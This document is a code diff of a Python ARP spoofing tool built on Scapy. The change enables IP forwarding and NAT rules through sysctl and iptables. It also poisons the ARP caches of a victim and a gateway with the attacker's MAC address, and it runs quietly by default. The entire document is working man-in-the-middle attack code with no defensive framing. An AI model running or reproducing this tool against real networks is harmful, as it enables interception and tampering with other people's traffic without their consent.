@@ -1,67 +1,68 @@
+# arp_spoofer.py
+
+import logging
+# Silence Scapy runtime warnings (including missing Ethernet dst MAC)
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
 import scapy.all as scapy
+import subprocess
 import time
-import argparse
 import sys
+import os
+
+def enable_ip_forwarding():
+    subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL)
+
+def setup_iptables(interface):
+    subprocess.call(["iptables", "-A", "FORWARD", "-i", interface, "-j", "ACCEPT"])
+    subprocess.call(["iptables", "-A", "FORWARD", "-o", interface, "-j", "ACCEPT"])
+    subprocess.call(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", interface, "-j", "MASQUERADE"])
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-    if answered_list:
-        return answered_list[0][1].hwsrc
-    else:
-        print(f"[!] Could not resolve MAC for {ip}")
-        sys.exit(1)
+    answered = scapy.srp(broadcast / arp_request, timeout=1, verbose=False)[0]
+    return answered[0][1].hwsrc if answered else None
 
-def spoof(target_ip, spoof_ip):
+def spoof(target_ip, spoof_ip, interface):
     target_mac = get_mac(target_ip)
-    packet = scapy.Ether(dst=target_mac) / scapy.ARP(
-        op=2,
-        pdst=target_ip,
-        hwdst=target_mac,
-        psrc=spoof_ip
-    )
-    scapy.sendp(packet, verbose=False)
+    if not target_mac:
+        print(f"[!] Could not find MAC for {target_ip}")
+        return
+    attacker_mac = scapy.get_if_hwaddr(interface)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
+    scapy.send(packet, verbose=False)
 
 def restore(dest_ip, src_ip):
     dest_mac = get_mac(dest_ip)
     src_mac = get_mac(src_ip)
-    packet = scapy.Ether(dst=dest_mac) / scapy.ARP(
-        op=2,
-        pdst=dest_ip,
-        hwdst=dest_mac,
-        psrc=src_ip,
-        hwsrc=src_mac
-    )
-    scapy.sendp(packet, count=4, verbose=False)
+    if not dest_mac or not src_mac:
+        print(f"[!] Could not find MAC for restoring {dest_ip} or {src_ip}")
+        return
+    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
+    scapy.send(packet, count=4, verbose=False)
 
-def run_spoofer(target_ip, gateway_ip, quiet=False):
-    print(f"[+] Spoofing {target_ip} <--> {gateway_ip} ... Press CTRL+C to stop.")
-    sent_packet_count = 0
+def run_spoofer(target_ip, gateway_ip, interface, quiet=True):
+    enable_ip_forwarding()
+    setup_iptables(interface)
 
+    # Only print this banner if quiet==False
+    if not quiet:
+        print(f"[+] Spoofing {target_ip} <--> {gateway_ip} ... Press CTRL+C to stop.")
+
+    sent = 0
     try:
         while True:
-            spoof(target_ip, gateway_ip)
-            spoof(gateway_ip, target_ip)
-            sent_packet_count += 2
-            if not quiet and sent_packet_count % 10 == 0:
-                print(f"[+] Packets sent: {sent_packet_count}")
+            spoof(target_ip, gateway_ip, interface)
+            spoof(gateway_ip, target_ip, interface)
+            sent += 2
+            if not quiet and sent % 10 == 0:
+                print(f"[+] Packets sent: {sent}")
             time.sleep(2)
     except KeyboardInterrupt:
-        print("\n[+] Detected CTRL+C ... Restoring ARP tables. Please wait...")
+        if not quiet:
+            print("\n[+] Stopping spoof. Restoring ARP tables...")
         restore(target_ip, gateway_ip)
         restore(gateway_ip, target_ip)
-        print("[+] ARP tables restored. Exiting.")
-
-def main():
-    parser = argparse.ArgumentParser(description="ARP Spoofer using Scapy")
-    parser.add_argument("-t", "--target", required=True, help="Target IP Address (victim)")
-    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP Address (router)")
-    parser.add_argument("--quiet", action="store_true", help="Suppress output of packet count")
-
-    args = parser.parse_args()
-    run_spoofer(args.target, args.gateway, args.quiet)
-
-if __name__ == "__main__":
-    main()
+        if not quiet:
+            print("[+] ARP tables restored.")
